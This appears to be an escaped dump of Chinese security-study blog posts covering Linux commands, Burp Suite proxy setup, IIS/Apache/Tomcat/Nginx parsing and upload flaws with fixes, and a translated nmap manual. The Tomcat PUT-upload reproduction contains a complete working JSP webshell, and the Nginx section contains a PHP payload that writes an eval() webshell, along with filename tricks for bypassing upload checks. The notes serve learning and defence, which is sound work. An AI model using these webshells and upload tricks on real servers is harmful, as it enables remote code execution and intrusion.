-f（强制重启）\nsu：切换用户；用法：su 用户名\nsudo：使用root用户执行命令；用法：sudo 命令\nuname：显示系统信息；用法：uname –a（显示系统详细信息）\nwhoami：显示自身用户名称\n--help：命令使用详情查询；用法：命令 –help\nclear：清空命令行\npwd：显示当前所在的目录\nmkdir：创建目录；用法：mkdir 目录名\nrmdir：删除空目录，非空不可删除；用法：rmdir 空目录名称\nrm：删除文件或者目录，用法：rm –rf 文件名或目录 (-r 表示递归，-f 表示强制)\ntouch：创建文件；用法：touch 文件名，如果文件存在，则修改当前文件时间，文件内容不变\nmv：重命名或者移动文件&#x2F;目录；用法： mv 原文件名 新文件名 或 mv 原文件位置 新文件位置\nchmod：修改文件或目录的权限chmod u+x 目录&#x2F;文件：给该目录&#x2F;文件所有者赋予执行权限chmod ug-x 目录&#x2F;文件：给该目录&#x2F;文件所有者和组用户减去执行权限chmod 777 目录&#x2F;文件：给该目录&#x2F;文件所有者、组用户、其他用户赋予所有权限chmod 764 目录&#x2F;文件：给该目录&#x2F;文件所有者赋予全部权限，组用户赋予读写权限，其他用户赋予读权限\nscp：复制文件和目录（1）从本地复制到远程scp local_file remote_username@remote_ip:remote_folder或者scp local_file remote_username@remote_ip:remote_file（2）从远程复制到本地scp remote_username@remote_ip:remote_folder local_file或者scp remote_username@remote_ip:remote_file local_file\n部分文章内容和图片应用自:\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/weixin_44604541/article/details/109558036\nhttps://blog.csdn.net/LYJ20010728/article/details/117349106\nhttps://blog.csdn.net/qq_41617034/article/details/115583211感谢这几位师傅了\n","slug":"命令执行漏洞","date":"2023-01-10T13:21:22.723Z","categories_index":"学习笔记","tags_index":"漏洞","author_index":"Abyssaler"},{"id":"d689efbf93d434acdbec39ba18988ad9","title":"如何为浏览器配置Burp Suite代理","content":"如何为各浏览器配置Burp Suite代理首先需要确定你的burp suite是否配置好了代理\n如图，这里我是配置好了\nGoogle配置安装Proxy SwitchyOmega插件\n\n插件配置新建一个burp suite模式\n\n配置参数，注意这里要与你burp suite配置中的一致\n\n保存\n\n以后你想用chrome抓包就直接在这里选了\n\n可能遇到的问题首次抓取HTTPS时，浏览器会报安全问题\n\n解决办法\n\n在此页面访问http://burp\n\n\n\n点右上角下载ca证书\n\n\n在chrome中导入证书\n\n\n\n找到之前下载的证书的位置（如果找不到，打开所有文件选项）\n\n然后一直下一步导入就成功了\n\n\n其他浏览器配置思路大致相同","slug":"如何为各浏览器配置Burp Suite代理","date":"2023-01-10T13:21:22.723Z","categories_index":"环境配置","tags_index":"工具","author_index":"Abyssaler"},{"id":"9ca6f9d849950348e5ffe49b9724c767","title":"中间件漏洞","content":"IIS简介IIS（Internet Information Services），互联网信息服务，由微软公司提供的可扩展web服务器，支 持HTTP、HTTP&#x2F;2、HTTPS等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP和后 续版本一起发布，IIS目前只支持Windows系统，不适用于其他操作系统\nIIS6.0解析漏洞第一种:文件解析IIS6.0&#x3D;&#x3D;&gt;1.asp;.jpg&#x3D;&#x3D;&gt;00截断的变形\n检测时会以最后一个.去判断，为jpg\n中间件解析时会以.asp解析\n\n原理：服务器默认不解析;号后面的内容，因此1.asp;.jpg便被解析成asp文件了\n\n修复方案：用正则写自定义WAF，阻止1.asp;.jpg类型的文件名\n\n\n\n第二种:目录解析a.asp&#x2F;123.jpg&#x3D;&#x3D;&gt;会不会是个目录？\n当中间件IIS6.0遇到a.asp&#x2F; 时 会把a.asp&#x2F; 下的所有内容当作asp文件执行\n\n原理：服务器默认会把.asp，.asa目录下的文件都解析成asp文件\nasp站点 IIS6.0：一般来说aspx的站点会兼容asp\nIIS6.0默认的可执行文件除了asp还包含asa、cer、cdx\n\n修复方案：用正则写自定义WAF，阻止a.asp&#x2F;123.jpg该类型的链接\n\n\n\nIIS7.0&#x2F;IIS7.5 解析漏洞\n\n\n\n\n\n\n\n\nwww.xx.com/phpinfo.jpg/1.php\n当中间件访问1.php 会认为它是一个PHP文件，当1.php不存在时，会自动跳转至上一级phpinfo.jpg，\n会把phpinfo.jpg误当作php文件去执行\n\n意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“&#x2F;xxx.php”，就可以获得网站的WebShell，在使用菜刀链接即可。\n\n1.jpg&#x2F;1.php\n\n修复方案：用正则写自定义WAF，阻止phpinfo.jpg&#x2F;1.php该类型的链接\n\n\n\n\n\nApache简介Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多 数计算机操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它 快速、可靠并且可通过简单的API扩展，将Perl&#x2F;Python等解释器编译到服务器中。\n配置文件漏洞Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件名，解析就再往左判断。 \n比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别文件名解析，apache就会把 oldboy.php.owf.rar解析成oldboy.php。\n漏洞形式:\n\n\n\n\n\n\n\n\n\nwww.xxxx.xxx.com/test.php.php123\n配置文件修改1、如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。 \n2、如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。\n修复方案apache配置文件，禁止.php.这样的文件执行\n在配置文件中加入\n&lt;Files ~ “.(php.|php3.)”&gt;\n\tOrder Allow,Deny\n\tDeny from all\n&lt;&#x2F;Files&gt;\n\n\n\nTomcat常见高危漏洞Tomcat后台弱口令上传war包\nTomcat的PUT的上传漏洞(CVE-2017-12615)\nTomcat反序列化漏洞(CVE-2016-8735)\nTomcat之JMX服务弱口令漏洞\nTomcat 样例目录session操控漏洞\nTomcat本地提权漏洞(CVE-2016-1240)\nTomcat win版默认空口令漏洞(CVE-2009-3548)\n\n\n\n简介TomcatTomcat是一个实现了JAVA EE标准的最小的WEB服务器，是Apache 软件基金会的Jakarta 项目 中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。因为Tomcat 技术先进、性 能稳定，而且开源免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流 行的Web 应用服务器。 \n在B&#x2F;S架构中，浏览器发出的http请求经过Tomcat中间件，转发到最终的目的服务器上，响应消息再通 过Tomcat返回给浏览器。\n远程代码执行漏洞(PUT请求上传漏洞)漏洞编号:CVE-2017-12615\n漏洞描述当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者通过构造的攻击请求向服 务器上传包含任意代码的 JSP 文件，造成任意代码执行，危害十分严重\n漏洞原理利用条件：Windows+Tomcat 7.0.x+配置文件readonly=false\n&lt;init-param&gt;\n&lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;\n&lt;param-value&gt;false&lt;&#x2F;param-value&gt;\n&lt;&#x2F;init-param&gt;\n\nTomcat 的 Servlet 是在 conf&#x2F;web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候， 是通过 JspServlet 处理请求的：而其他的静态文件是通过 DefaultServlet 处理的：可以得知，“1.jsp空 格”（末尾有一个和空格）并不能匹配到 JspServlet，而是会交由 DefaultServlet 去处理。 \n当处理 PUT 请求时：会调用 resources.bind：dirContext 为 FileDirContext：调用 rebind 创建文 件：又由于 Windows 不允许“ ”作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。\n影响版本Apache Tomcat 7.0.0 - 7.0.81\n需要开启PUT请求方法\n修复方案readonly参数为true\n升级版本\n漏洞复现1.通过vulhub拉取环境\n\n2.通过burp抓取访问目录根目录的请求包，并发送到repeater模块\n\n3.将GET请求方式修改为OPTIONOS\ntips：OPTIONS请求方式请求服务器返回所支持的所有HTTP请求方法\n\n不允许此请求，再次修改\n\n4.OPTIONOS请求改为PUT，修改名字,并在下面添加jsp的shell\nshell: \n密码为passwd\n&lt;%!\n    class U extends ClassLoader &#123;\n        U(ClassLoader c) &#123;\n            super(c);\n        &#125;\n        public Class g(byte[] b) &#123;\n            return super.defineClass(b, 0, b.length);\n        &#125;\n    &#125;\n \n    public byte[] base64Decode(String str) throws Exception &#123;\n        try &#123;\n            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);\n            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);\n        &#125; catch (Exception e) &#123;\n            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);\n            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);\n            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);\n        &#125;\n    &#125;\n%&gt;\n&lt;%\n    String cls &#x3D; request.getParameter(&quot;passwd&quot;);\n    if (cls !&#x3D; null) &#123;\n        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n    &#125;\n%&gt;\n\n\n上传成功\n\n5.蚁剑连接测试代码\n\n注意：绕过 JspServlet 方式\nshell.jsp%20\nshell.jsp::$DATA\nshell.jsp&#x2F;\n\n\n\nNginx简介Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP&#x2F;POP3&#x2F;SMTP服务。 Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，在BSD-like 协议下发行。 \n其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好。\n文件解析漏洞漏洞描述该漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞。由于nginx.conf的如下配置导致 nginx把以’.php’结尾的文件交给fastcgi处理,对于任意文件名，在后面添加&#x2F;xxx.php（xxx）为任意字符 后，即可将文件作为php解析。\n漏洞原理Nginx默认是以CGI的方式支持PHP解析，普遍的做法是在Nginx配置文件中通过正则匹配设置 SCRIPT_FILENAME。\n当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为 “phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参 数，并将phpinfo.jpg作为PHP文件解析呢？ \n这就要说到fix_pathinfo选项， 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为 SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解 析了。\n漏洞形式www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php\nwww.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg%00.php [xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)]\nwww.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20.php\n\n另一种攻击手法： \n上传一个名字为test.jpg，以下为文件内容：\n&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;\n\n然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。\n漏洞复现1.切换php版本\n\n2.打开配置文件\n\n3.在网站根目录下创建111.jpg\n\n\n4.访问111.jpg\n\n5.在111.jpg后加&#x2F;xxx.php,我们111.jpg中的函数就会被执行\n\n当访问&#x2F;111.jpg&#x2F;xxx.php时，nginx将查看url，看到它以.php结尾，将路径传给PHP  fastcgi进行处理。但是fastcgi在处理’xxx.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo&#x3D;1 发挥作用,这项配置默认开启，值为1，用于修复路径,如果当前路径不存在则采用上层路径。\n为此这里交由fastcgi处理的文件就变成了’&#x2F;1.jpg’。新版本的php的配置文件php-fpm.conf引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件。\nCGI公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编 写的程序可以扩展服务器功能。 CGI 应用程序能与浏览器进行交互，还可通过数据API与数据库服务器等外部数据源进行通信，从数据库 服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库 中。 \n几乎所有服务器都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI 分为标准CGI和间接CGI两种。标准CGI使用命令行参数或环境变量表示服务器的详细请求，服务器与浏 览器通信采用标准输入输出方式。 间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入 输出进行通信 。\n修复方案1.将php.ini文件中的cgi.fix_pathinfo的值设置为0\n2.php-fpm.conf中的security.limit_extensions后面的值设置为.php\n","slug":"中间件漏洞","date":"2023-01-10T13:21:22.723Z","categories_index":"学习笔记","tags_index":"漏洞","author_index":"Abyssaler"},{"id":"37e3720854a52996fd51ede25d9a35d3","title":"nmap扫描基础","content":"声明：此篇文章是引用来方便自己学习的，原出处在这里\n\n\n\n\n\n\n\n\n\nhttps://gitee.com/qianyongFeng/wiki/blob/master\n名称nmap — 网络探测工具和安全&#x2F;端口扫描器\n命令nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }\n描述注意:本文档描述了Nmap版本4.50。最新文档以英语 https://nmap.org/book/man.html提供。\nNmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器&#x2F;防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。\nNmap输出的是扫描目标的列表，以及每个目标的补充信息，至于是哪些信息则依赖于所使用的选项。 “所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。状态可能是 open(开放的)，filtered(被过滤的)， closed(关闭的)，或者unfiltered(未被过滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接&#x2F;报文。 filtered(被过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap无法得知 它是 open(开放的) 还是 closed(关闭的)。 closed(关闭的) 端口没有应用程序在它上面监听，但是他们随时可能开放。 当端口对Nmap的探测做出响应，但是Nmap无法确定它们是关闭还是开放时，这些端口就被认为是 unfiltered(未被过滤的) 如果Nmap报告状态组合 open|filtered 和 closed|filtered时，那说明Nmap无法确定该端口处于两个状态中的哪一个状态。 当要求进行版本探测时，端口表也可以包含软件的版本信息。当要求进行IP协议扫描时 (-sO)，Nmap提供关于所支持的IP协议而不是正在监听的端口的信息。\n除了所感兴趣的端口表，Nmap还能提供关于目标机的进一步信息，包括反向域名，操作系统猜测，设备类型，和MAC地址。\n一个典型的Nmap扫描如例 1 “一个典型的Nmap扫描”所示。在这个例子中，唯一的选项是-A， 用来进行操作系统及其版本的探测，-T4 可以加快执行速度，接着是两个目标主机名。\n例 1. 一个典型的Nmap扫描\n# nmap -A -T4 scanme.nmap.org\n\nNmap scan report for scanme.nmap.org (74.207.244.221)\nHost is up (0.029s latency).\nrDNS record for 74.207.244.221: li86-221.members.linode.com\nNot shown: 995 closed ports\nPORT     STATE    SERVICE     VERSION\n22&#x2F;tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)\n| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)\n|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)\n80&#x2F;tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))\n|_http-title: Go ahead and ScanMe!\n646&#x2F;tcp  filtered ldp\n1720&#x2F;tcp filtered H.323&#x2F;Q.931\n9929&#x2F;tcp open     nping-echo  Nping echo\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6.39\nOS details: Linux 2.6.39\nNetwork Distance: 11 hops\nService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:kernel\n\nTRACEROUTE (using port 53&#x2F;tcp)\nHOP RTT      ADDRESS\n[Cut first 10 hops for brevity]\n11  17.65 ms li86-221.members.linode.com (74.207.244.221)\n\nNmap done: 1 IP address (1 host up) scanned in 14.40 seconds\n\n选项概要当 Nmap 不带选项运行时，该选项概要会被输出，最新的版本在这里 http://www.insecure.org/nmap/data/nmap.usage.txt。它帮助人们记住最常用的选项，但不 能替代本手册其余深入的文档，一些晦涩的选项甚至不在这里。\nUsage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;\nTARGET SPECIFICATION:\n    Can pass hostnames, IP addresses, networks, etc.\n    Ex: scanme.nmap.org, microsoft.com&#x2F;24, 192.168.0.1; 10.0-255.0-255.1-254\n    -iL &lt;inputfilename&gt;: Input from list of hosts&#x2F;networks\n    -iR &lt;num hosts&gt;: Choose random targets\n    --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts&#x2F;networks\n    --excludefile &lt;exclude_file&gt;: Exclude list from file\nHOST DISCOVERY:\n    -sL: List Scan - simply list targets to scan\n    -sP: Ping Scan - go no further than determining if host is online\n    -P0: Treat all hosts as online -- skip host discovery\n    -PS&#x2F;PA&#x2F;PU [portlist]: TCP SYN&#x2F;ACK or UDP discovery probes to given ports\n    -PE&#x2F;PP&#x2F;PM: ICMP echo, timestamp, and netmask request discovery probes\n    -n&#x2F;-R: Never do DNS resolution&#x2F;Always resolve [default: sometimes resolve]\nSCAN TECHNIQUES:\n    -sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon scans\n    -sN&#x2F;sF&#x2F;sX: TCP Null, FIN, and Xmas scans\n    --scanflags &lt;flags&gt;: Customize TCP scan flags\n    -sI &lt;zombie host[:probeport]&gt;: Idlescan\n    -sO: IP protocol scan\n    -b &lt;ftp relay host&gt;: FTP bounce scan\nPORT SPECIFICATION AND SCAN ORDER:\n    -p &lt;port ranges&gt;: Only scan specified ports\n    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080\n    -F: Fast - Scan only the ports listed in the nmap-services file)\n    -r: Scan ports consecutively - don&#39;t randomize\nSERVICE&#x2F;VERSION DETECTION:\n    -sV: Probe open ports to determine service&#x2F;version info\n    --version-light: Limit to most likely probes for faster identification\n    --version-all: Try every single probe for version detection\n    --version-trace: Show detailed version scan activity (for debugging)\nOS DETECTION:\n    -O: Enable OS detection\n    --osscan-limit: Limit OS detection to promising targets\n    --osscan-guess: Guess OS more aggressively\nTIMING AND PERFORMANCE:\n    -T[0-6]: Set timing template (higher is faster)\n    --min-hostgroup&#x2F;max-hostgroup &lt;msec&gt;: Parallel host scan group sizes\n    --min-parallelism&#x2F;max-parallelism &lt;msec&gt;: Probe parallelization\n    --min_rtt_timeout&#x2F;max-rtt-timeout&#x2F;initial-rtt-timeout &lt;msec&gt;: Specifies probe round trip time.\n    --host-timeout &lt;msec&gt;: Give up on target after this long\n    --scan-delay&#x2F;--max_scan-delay &lt;msec&gt;: Adjust delay between probes\nFIREWALL&#x2F;IDS EVASION AND SPOOFING:\n    -f; --mtu &lt;val&gt;: fragment packets (optionally w&#x2F;given MTU)\n    -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys\n    -S &lt;IP_Address&gt;: Spoof source address\n    -e &lt;iface&gt;: Use specified interface\n    -g&#x2F;--source-port &lt;portnum&gt;: Use given port number\n    --data-length &lt;num&gt;: Append random data to sent packets\n    --ttl &lt;val&gt;: Set IP time-to-live field\n    --spoof-mac &lt;mac address, prefix, or vendor name&gt;: Spoof your MAC address\nOUTPUT:\n    -oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.\n    -oA &lt;basename&gt;: Output in the three major formats at once\n    -v: Increase verbosity level (use twice for more effect)\n    -d[level]: Set or increase debugging level (Up to 9 is meaningful)\n    --packet-trace: Show all packets sent and received\n    --iflist: Print host interfaces and routes (for debugging)\n    --append-output: Append to rather than clobber specified output files\n    --resume &lt;filename&gt;: Resume an aborted scan\n    --stylesheet &lt;path&#x2F;URL&gt;: XSL stylesheet to transform XML output to HTML\n    --no_stylesheet: Prevent Nmap from associating XSL stylesheet w&#x2F;XML output\nMISC:\n    -6: Enable IPv6 scanning\n    -A: Enables OS detection and Version detection\n    --datadir &lt;dirname&gt;: Specify custom Nmap data file location\n    --send-eth&#x2F;--send-ip: Send packets using raw ethernet frames or IP packets\n    --privileged: Assume that the user is fully privileged\n    -V: Print version number\n    -h: Print this help summary page.\nEXAMPLES:\n    nmap -v -A scanme.nmap.org\n    nmap -v -sP 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8\n    nmap -v -iR 10000 -P0 -p 80\n\n目标说明除了选项，所有出现在Nmap命令行上的都被视为对目标主机的说明。 最简单的情况是指定一个目标IP地址或主机名。\n有时候您希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个&#x2F;在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有 相同比特的所有IP地址或主机。 例如，192.168.10.0&#x2F;24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40&#x2F;24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org&#x2F;16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是&#x2F;1， 这将会扫描半个互联网。最大值是&#x2F;32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。\nCIDR标志位很简洁但有时候不够灵活。例如，您也许想要扫描 192.168.0.0&#x2F;16，但略过任何以.0或者.255 结束的IP地址，因为它们通常是广播地址。 Nmap通过八位字节地址范围支持这样的扫描 您可以用逗号分开的数字或范围列表为IP地址的每个八位字节指定它的范围。 例如，192.168.0-255.1-254 将略过在该范围内以.0和.255结束的地址。 范围不必限于最后的8位：0-255.0-255.13.37 将在整个互联网范围内扫描所有以13.37结束的地址。 这种大范围的扫描对互联网调查研究也许有用。\nIPv6地址只能用规范的IPv6地址或主机名指定。 CIDR 和八位字节范围不支持IPv6，因为它们对于IPv6几乎没什么用。\nNmap命令行接受多个主机说明，它们不必是相同类型。命令nmap scanme.nmap.org 192.168.0.0&#x2F;8 10.0.0，1，3-7.0-255将和您预期的一样执行。\n虽然目标通常在命令行指定，下列选项也可用来控制目标的选择：\n-iL (从列表中输入)\n从 **中读取目标说明。在命令行输入 一堆主机名显得很笨拙，然而经常需要这样。 例如，您的DHCP服务器可能导出10,000个当前租约的列表，而您希望对它们进行 扫描。如果您不是使用未授权的静态IP来定位主机，或许您想要扫描所有IP地址。 只要生成要扫描的主机的列表，用-iL 把文件名作为选项传给Nmap。列表中的项可以是Nmap在 命令行上接受的任何格式(IP地址，主机名，CIDR，IPv6，或者八位字节范围)。 每一项必须以一个或多个空格，制表符或换行符分开。 如果您希望Nmap从标准输入而不是实际文件读取列表， 您可以用一个连字符(-)作为文件名。\n-iR (随机选择目标)\n对于互联网范围内的调查和研究， 您也许想随机地选择目标。 选项告诉 Nmap生成多少个IP。不合需要的IP如特定的私有，组播或者未分配的地址自动 略过。选项 0 意味着永无休止的扫描。记住，一些网管对于未授权的扫描可能会很感冒并加以抱怨。 使用该选项的后果自负! 如果在某个雨天的下午，您觉得实在无聊， 试试这个命令nmap -sS -PS80 -iR 0 -p 80随机地找一些网站浏览。\n–exclude &lt;host1[,host2][,host3],…&gt; (排除主机&#x2F;网络)\n如果在您指定的扫描范围有一些主机或网络不是您的目标， 那就用该选项加上以逗号分隔的列表排除它们。该列表用正常的Nmap语法， 因此它可以包括主机名，CIDR，八位字节范围等等。 当您希望扫描的网络包含执行关键任务的服务器，已知的对端口扫描反应强烈的 系统或者被其它人看管的子网时，这也许有用。\n–excludefile (排除文件中的列表)\n这和–exclude 选项的功能一样，只是所排除的目标是用以 换行符，空格，或者制表符分隔的 **提供的，而不是在命令行上输入的。\n主机发现任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图突破防火墙的封锁。\n由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN&#x2F;ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0&#x2F;8尤其普遍。那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。主机发现能够找到零星分布于IP地址海洋上的那些机器。\n如果没有给出主机发现的选项，Nmap 就发送一个TCP ACK报文到80端口和一个ICMP回声请求到每台目标机器。 一个例外是ARP扫描用于局域网上的任何目标机器。对于非特权UNIX shell用户，使用connect()系统调用会发送一个SYN报文而不是ACK 这些默认行为和使用-PA -PE选项的效果相同。 扫描局域网时，这种主机发现一般够用了，但是对于安全审核，建议进行 更加全面的探测。\n-P选项(用于选择 ping的类型)可以被结合使用。 您可以通过使用不同的TCP端口&#x2F;标志位和ICMP码发送许多探测报文 来增加穿透防守严密的防火墙的机会。另外要注意的是即使您指定了其它 -P*选项，ARP发现(-PR)对于局域网上的 目标而言是默认行为，因为它总是更快更有效。\n下列选项控制主机发现。\n-sL (列表扫描)\n列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。默认情况下，Nmap仍然对主机进行反向域名解析以获取 它们的名字。简单的主机名能给出的有用信息常常令人惊讶。例如， fw.chi.playboy.com是花花公子芝加哥办公室的 防火墙。Nmap最后还会报告IP地址的总数。列表扫描可以很好的确保您拥有正确的目标IP。 如果主机的域名出乎您的意料，那么就值得进一步检查以防错误地扫描其它组织的网络。\n既然只是打印目标主机的列表，像其它一些高级功能如端口扫描，操作系统探测或者Ping扫描 的选项就没有了。如果您希望关闭ping扫描而仍然执行这样的高级功能，请继续阅读关于 -P0选项的介绍。\n-sP (Ping扫描)\n该选项告诉Nmap仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机。 没有进一步的测试 (如端口扫描或者操作系统探测)。 这比列表扫描更积极，常常用于 和列表扫描相同的目的。它可以得到些许目标网络的信息而不被特别注意到。 对于攻击者来说，了解多少主机正在运行比列表扫描提供的一列IP和主机名往往更有价值。\n系统管理员往往也很喜欢这个选项。 它可以很方便地得出 网络上有多少机器正在运行或者监视服务器是否正常运行。常常有人称它为 地毯式ping，它比ping广播地址更可靠，因为许多主机对广播请求不响应。\n-sP选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。如果非特权用户执行，就发送一个SYN报文 (用connect()系统调用)到目标机的80端口。 当特权用户扫描局域网上的目标机时，会发送ARP请求(-PR)， ，除非使用了–send-ip选项。 -sP选项可以和除-P0)之外的任何发现探测类型-P* 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。 当防守严密的防火墙位于运行Nmap的源主机和目标网络之间时， 推荐使用那些高级选项。否则，当防火墙捕获并丢弃探测包或者响应包时，一些主机就不能被探测到。\n-P0 (无ping)\n该选项完全跳过Nmap发现阶段。 通常Nmap在进行高强度的扫描时用它确定正在运行的机器。 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。用-P0禁止 主机发现会使Nmap对每一个指定的目标IP地址 进行所要求的扫描。所以如果在命令行指定一个B类目标地址空间(&#x2F;16)， 所有 65,536 个IP地址都会被扫描。 -P0的第二个字符是数字0而不是字母O。 和列表扫描一样，跳过正常的主机发现，但不是打印一个目标列表， 而是继续执行所要求的功能，就好像每个IP都是活动的。\n-PS [portlist] (TCP SYN Ping)\n该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变nmap.h) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指定。 甚至可以指定一个以逗号分隔的端口列表(如 -PS22，23，25，80，113，1050，35000)， 在这种情况下，每个端口会被并发地扫描。\nSYN标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个RST (复位) 包会发回来。 如果碰巧端口是开放的，目标会进行TCP三步握手的第二步，回应 一个SYN&#x2F;ACK TCP报文。然后运行Nmap的机器则会扼杀这个正在建立的连接， 发送一个RST而非ACK报文，否则，一个完全的连接将会建立。 RST报文是运行Nmap的机器而不是Nmap本身响应的，因为它对收到 的SYN&#x2F;ACK感到很意外。\nNmap并不关心端口开放还是关闭。 无论RST还是SYN&#x2F;ACK响应都告诉Nmap该主机正在运行。\n在UNIX机器上，通常只有特权用户 root 能否发送和接收 原始的TCP报文。因此作为一个变通的方法，对于非特权用户， 